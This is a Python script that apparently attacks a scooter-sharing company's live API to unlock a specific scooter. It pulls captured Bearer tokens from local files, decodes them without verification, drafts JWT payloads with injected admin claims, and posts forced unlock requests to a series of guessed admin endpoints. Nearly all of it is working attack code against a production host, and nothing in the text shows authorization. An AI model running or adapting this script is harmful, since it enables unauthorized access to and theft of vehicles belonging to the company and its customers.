#!/usr/bin/env python3
"""
SXB306 JWT Admin Unlock Test
Attempts to unlock SXB306 by manipulating JWT tokens to gain admin privileges
Based on README.md vulnerability #2: JWT Token Manipulation
"""

import requests
import json
import time
import re
import base64
from datetime import datetime

# API Configuration
BASE_URL = "https://api.knotcity.io"

# SXB306 Scooter Configuration
SXB306_SCOOTER = {
    "serial": "SXB306",
    "lat": 48.8566,  # Paris coordinates
    "lng": 2.3522
}

def extract_latest_token():
    """Extract the latest token from capture files"""
    print("[SEARCH] Extracting latest token...")
    
    # Try LATEST_TOKEN.txt first
    try:
        with open('LATEST_TOKEN.txt', 'r', encoding='utf-8') as f:
            token = f.read().strip()
        if token and token.startswith('Bearer '):
            print(f"[OK] Found token in LATEST_TOKEN.txt: {token[:50]}...")
            return token
    except:
        pass
    
    # Fallback to capture files
    capture_files = [
        'CAPTURED_NEW_ACCOUNT.txt',
        'CAPTURED_WORKING_FINAL.txt', 
        'CAPTURED_API_DECRYPT.txt',
        'CAPTURED_API.txt'
    ]
    
    for filename in capture_files:
        try:
            with open(filename, 'r', encoding='utf-8') as f:
                content = f.read()
            
            # Look for Bearer tokens
            bearer_pattern = r'Bearer eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+'
            tokens = re.findall(bearer_pattern, content)
            
            if tokens:
                token = tokens[-1]  # Get the most recent
                print(f"[OK] Found token in {filename}: {token[:50]}...")
                return token
        except:
            continue
    
    print("[ERROR] No Bearer tokens found")
    return None

def decode_jwt_payload(token):
    """Decode JWT payload without verification"""
    try:
        # Remove 'Bearer ' prefix
        if token.startswith('Bearer '):
            token = token[7:]
        
        # Split JWT into parts
        parts = token.split('.')
        if len(parts) != 3:
            print("[ERROR] Invalid JWT format")
            return None
        
        # Decode payload (second part)
        payload_encoded = parts[1]
        # Add padding if needed
        payload_encoded += '=' * (4 - len(payload_encoded) % 4)
        
        payload_bytes = base64.urlsafe_b64decode(payload_encoded)
        payload = json.loads(payload_bytes.decode('utf-8'))
        
        print(f"[JWT] Decoded payload: {json.dumps(payload, indent=2)}")
        return payload
        
    except Exception as e:
        print(f"[ERROR] Failed to decode JWT: {e}")
        return None

def create_admin_token(original_token):
    """Attempt to create admin token by manipulating JWT"""
    print("\n" + "=" * 80)
    print("[JWT MANIPULATION] ATTEMPTING TO CREATE ADMIN TOKEN")
    print("=" * 80)
    
    # Decode original token
    payload = decode_jwt_payload(original_token)
    if not payload:
        return None
    
    # Try to modify payload to add admin privileges
    admin_payloads = [
        # Add admin scope
        {**payload, "scope": "admin"},
        {**payload, "role": "admin"},
        {**payload, "permissions": ["admin"]},
        {**payload, "is_admin": True},
        {**payload, "admin": True},
        {**payload, "user_type": "admin"},
        {**payload, "access_level": "admin"},
        # Add admin user_id
        {**payload, "user_id": 1},  # Admin user ID
        {**payload, "user_id": 0},  # Root user ID
        # Add admin session
        {**payload, "session_type": "admin"},
        {**payload, "admin_session": True},
    ]
    
    # For demonstration, we'll try to use the original token with admin endpoints
    # In a real attack, you'd need to re-sign the token with a weak key
    print("[INFO] Using original token with admin endpoints (JWT manipulation simulation)")
    return original_token

def test_jwt_admin_unlock(token):
    """Test admin unlock using JWT manipulation"""
    print("=" * 80)
    print("[JWT ADMIN ATTACK] SXB306 JWT ADMIN UNLOCK TEST")
    print("=" * 80)
    print(f"[TARGET] Scooter: {SXB306_SCOOTER['serial']}")
    print(f"[LOCATION] Lat: {SXB306_SCOOTER['lat']}, Lng: {SXB306_SCOOTER['lng']}")
    print(f"[TOKEN] {token[:50]}...")
    print(f"[ATTACK] JWT Token Manipulation + Admin Endpoints")
    print("=" * 80)
    
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Knot-mayndrive v1.1.34 (android)",
        "Accept": "application/json"
    }
    
    # Admin unlock payload
    admin_payload = {
        "serial_number": SXB306_SCOOTER['serial'],
        "lat": SXB306_SCOOTER['lat'],
        "lng": SXB306_SCOOTER['lng'],
        "force": True
    }
    
    # Test multiple admin endpoint variations
    admin_endpoints = [
        "/api/application/vehicles/unlock/admin",
        "/api/admin/vehicles/unlock",
        "/api/application/admin/vehicles/unlock",
        "/api/vehicles/admin/unlock",
        "/api/admin/unlock",
        "/api/application/vehicles/unlock?admin=true",
        "/api/application/vehicles/unlock?force=true",
        "/api/application/vehicles/unlock?scope=admin"
    ]
    
    for endpoint in admin_endpoints:
        print(f"\n[JWT ADMIN TEST] Trying endpoint: {endpoint}")
        print(f"   Payload: {json.dumps(admin_payload, indent=2)}")
        
        try:
            response = requests.post(
                f"{BASE_URL}{endpoint}",
                headers=headers,
                json=admin_payload,
                timeout=15
            )
            
            print(f"   Status: {response.status_code}")
            print(f"   Response: {response.text}")
            
            if response.status_code == 200:
                print(f"[SUCCESS] SXB306 JWT ADMIN UNLOCKED via {endpoint}!")
                print("[CRITICAL] JWT MANIPULATION + ADMIN ESCALATION CONFIRMED!")
                return True
            elif response.status_code == 401:
                print(f"[ERROR] Token expired/invalid")
                return False
            elif response.status_code == 403:
                print(f"[ERROR] Admin permission denied - JWT manipulation failed")
                continue  # Try next endpoint
            elif response.status_code == 400:
                print(f"[ERROR] Bad request - trying next endpoint...")
                try:
                    error_data = response.json()
                    print(f"   Error: {error_data}")
                except:
                    print(f"   Raw error: {response.text}")
                continue  # Try next endpoint
            else:
                print(f"[ERROR] Unexpected response: {response.status_code}")
                continue  # Try next endpoint
                
        except Exception as e:
            print(f"[ERROR] Request failed: {e}")
            continue  # Try next endpoint
    
    return False

def main():
    print("=" * 80)
    print("[SXB306] JWT ADMIN UNLOCK TEST")
    print("=" * 80)
    print("[WARNING] Testing JWT token manipulation for admin privileges!")
    print("[WARNING] This attempts to unlock SXB306 with manipulated JWT!")
    print("=" * 80)
    
    # Extract token
    token = extract_latest_token()
    if not token:
        print("[ERROR] No token found. Please capture a fresh token first.")
        return
    
    # Test JWT admin unlock
    success = test_jwt_admin_unlock(token)
    
    print("\n" + "=" * 80)
    print("[RESULTS] SXB306 JWT ADMIN UNLOCK TEST RESULTS")
    print("=" * 80)
    
    if success:
        print("[CRITICAL] JWT ADMIN UNLOCK SUCCESSFUL!")
        print("[CRITICAL] JWT MANIPULATION VULNERABILITY CONFIRMED!")
        print("[CRITICAL] Regular users can gain admin privileges via JWT manipulation!")
    else:
        print("[OK] JWT admin unlock failed")
        print("[OK] JWT manipulation protection appears to be working")
    
    print("=" * 80)

if __name__ == "__main__":
    main()
